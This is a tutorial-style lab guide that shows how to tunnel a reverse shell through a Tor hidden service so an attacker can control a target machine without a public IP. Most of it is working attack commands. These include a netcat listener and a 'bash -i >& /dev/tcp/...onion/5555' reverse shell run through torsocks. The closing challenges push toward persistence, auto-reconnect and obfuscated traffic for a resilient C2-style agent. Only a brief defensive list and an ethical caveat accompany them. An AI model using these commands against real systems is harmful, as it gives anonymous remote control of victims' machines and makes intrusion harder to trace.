# 🕶️ Tor-Routed Reverse Shell Lab (Free Port Forwarding Alternative)

**Author: Aryan Giri**

---

## 🎯 Objective

Build a fully working reverse shell using Tor hidden services — no public IP, no paid TCP port forwarding.

👉 This solves:

* NAT restrictions
* ISP blocking inbound ports
* Paid port forwarding/VPS dependency

---

# 🧠 LAB ARCHITECTURE

* **Attacker Machine** → Hosts hidden service + listener
* **Target Machine (Victim VM)** → Connects back via Tor

---

# ⚙️ ATTACKER SIDE (Step-by-Step)

## 1. Install Tor

```bash
sudo apt update
sudo apt install tor -y
```

## 2. Configure Hidden Service

```bash
sudo nano /etc/tor/torrc
```

Add at bottom:

```
HiddenServiceDir /var/lib/tor/reverse_shell/
HiddenServicePort 5555 127.0.0.1:5555
```

## 3. Restart Tor

```bash
sudo systemctl restart tor
```

## 4. Get Your .onion Address

```bash
sudo cat /var/lib/tor/reverse_shell/hostname
```

Save this:

```
example123abc.onion
```

## 5. Start Listener

```bash
nc -lvnp 5555
```

👉 Your machine is now waiting for incoming shell

---

# 💻 TARGET MACHINE (VICTIM VM)

## 1. Install Tor + torsocks

```bash
sudo apt update
sudo apt install tor torsocks -y
sudo systemctl start tor
```

## 2. Execute Reverse Shell

Replace onion address:

```bash
torsocks bash -i >& /dev/tcp/example123abc.onion/5555 0>&1
```

---

# 🔥 RESULT (What You Should See)

On attacker terminal:

```bash
whoami
id
pwd
```

👉 You now control the target machine remotely

---

# 💡 WHY THIS IS POWERFUL

## ❌ Traditional Method Problems

* Requires port forwarding
* Needs public IP or VPS
* Often paid solutions

## ✅ Tor Method Advantages

* 100% FREE
* Works behind NAT
* No router configuration
* Anonymous endpoint (.onion)

👉 Tor acts like a **free global port forwarding layer**

---

# 🔍 WHAT'S HAPPENING INTERNALLY

* Target connects to Tor network
* Traffic is encrypted multiple times
* Routed through relays
* Delivered to your hidden service
* Netcat receives connection locally

---

# 🧪 TROUBLESHOOTING

## Test Tor on Target

```bash
torsocks curl https://check.torproject.org
```

## Check Hidden Service

```bash
sudo systemctl status tor
sudo cat /var/lib/tor/reverse_shell/hostname
```

## Permission Fix

```bash
sudo torsocks bash -i >& /dev/tcp/example123abc.onion/5555 0>&1
```

---

# 🛡️ DEFENSIVE INSIGHT

Detection signs:

* Tor traffic spikes
* torsocks usage
* unusual bash processes

---

# ⚖️ ETHICAL NOTE

This technique is used in:

* Red teaming
* Malware C2
* Privacy systems

👉 Use ONLY in:

* Your own lab
* CTFs
* Authorized environments

---

# 🚀 CHALLENGE

Level up this lab:

1. Add persistence (cron/systemd)
2. Replace bash with Python reverse shell
3. Auto-reconnect on disconnect
4. Obfuscate traffic (obfs4)

---

## ⚡ FINAL MISSION

Build a **Tor-based resilient agent** that reconnects automatically after reboot.

---
